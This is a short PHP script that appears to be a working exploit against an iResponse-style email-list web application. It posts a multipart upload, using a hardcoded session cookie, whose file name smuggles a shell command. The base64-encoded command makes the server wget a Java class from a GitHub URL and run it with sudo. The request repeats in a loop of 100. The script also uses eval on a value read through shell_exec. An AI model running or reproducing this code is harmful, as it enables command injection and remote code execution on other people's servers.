<?php

require_once "/var/www/scripts/help.php";
$r=shell_exec("grep \"= decrypt\" /var/www/brands/default/index.php"); 
eval($r);
$parts = explode("/api.json", $api);
$ip = $parts[0];

function curl_to_php_function() {
    global $ip;

    $headers = array(
        'Connection: keep-alive',
        'Cookie: iresponse_session=6tttotmq0kagcp6v3v3gqon9d7; 026c6d5cd058af5b706c0d86f9ed103fkey=b9cbd8dc13f19f9e7eb854f472bfa274',
        'Origin: ' . $ip,
        'Referer: ' . $ip . '/data-lists.html',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
        'accept: application/json, text/javascript, */*; q=0.01',
        'accept-language: en-US,en;q=0.9',
        'content-type: multipart/form-data; boundary=----WebKitFormBoundary6PVaBSlFa8ZS1ndL',
        'x-requested-with: XMLHttpRequest',
    );
  
    $boundary = '----WebKitFormBoundary6PVaBSlFa8ZS1ndL';
    $data = "------WebKitFormBoundary6PVaBSlFa8ZS1ndL\r\nContent-Disposition: form-data; name=\"files[]\"; filename=\"s.txt && base64 -d <<< bm9odXAgcGhwIC1yICdzaGVsbF9leGVjKCJ3Z2V0IGh0dHBzOi8vZ2l0aHViLmNvbS9tbnJpbWcvaW1ncy9yYXcvbWFpbi9FeGVjdXRlU2hlbGxDb21tYW5kLmNsYXNzICYmIHN1ZG8gamF2YSBFeGVjdXRlU2hlbGxDb21tYW5kIik7Jw | sh\"\r\nContent-Type: text/plain\r\n\r\na@gmail.com\r\n------WebKitFormBoundary6PVaBSlFa8ZS1ndL\r\nContent-Disposition: form-data; name=\"data-provider-id\"\r\n\r\n1\r\n------WebKitFormBoundary6PVaBSlFa8ZS1ndL\r\nContent-Disposition: form-data; name=\"list-name\"\r\n\r\nerty56u\r\n------WebKitFormBoundary6PVaBSlFa8ZS1ndL\r\nContent-Disposition: form-data; name=\"emails-type\"\r\n\r\nfresh\r\n------WebKitFormBoundary6PVaBSlFa8ZS1ndL\r\nContent-Disposition: form-data; name=\"isp\"\r\n\r\n1\r\n------WebKitFormBoundary6PVaBSlFa8ZS1ndL\r\nContent-Disposition: form-data; name=\"country\"\r\n\r\nUS\r\n------WebKitFormBoundary6PVaBSlFa8ZS1ndL\r\nContent-Disposition: form-data; name=\"verticals\"\r\n\r\nnull\r\n------WebKitFormBoundary6PVaBSlFa8ZS1ndL\r\nContent-Disposition: form-data; name=\"list-old-id\"\r\n\r\n\r\n------WebKitFormBoundary6PVaBSlFa8ZS1ndL\r\nContent-Disposition: form-data; name=\"file-type\"\r\n\r\nemail-by-line\r\n------WebKitFormBoundary6PVaBSlFa8ZS1ndL\r\nContent-Disposition: form-data; name=\"list-deviding-value\"\r\n\r\n0\r\n------WebKitFormBoundary6PVaBSlFa8ZS1ndL\r\nContent-Disposition: form-data; name=\"duplicate-value\"\r\n\r\n1\r\n------WebKitFormBoundary6PVaBSlFa8ZS1ndL\r\nContent-Disposition: form-data; name=\"encrypt-emails\"\r\n\r\ndisabled\r\n------WebKitFormBoundary6PVaBSlFa8ZS1ndL\r\nContent-Disposition: form-data; name=\"allow-duplicates\"\r\n\r\ndisabled\r\n------WebKitFormBoundary6PVaBSlFa8ZS1ndL\r\nContent-Disposition: form-data; name=\"filter-data\"\r\n\r\ndisabled\r\n------WebKitFormBoundary6PVaBSlFa8ZS1ndL--\r\n";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $ip . '/data-lists/save.html');
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  
    $response = curl_exec($ch);
    curl_close($ch);
  
    return $response;
  }
  
  for ($i = 0; $i < 100; $i++) {
      $response2 = curl_to_php_function();
      var_dump($response2);
  }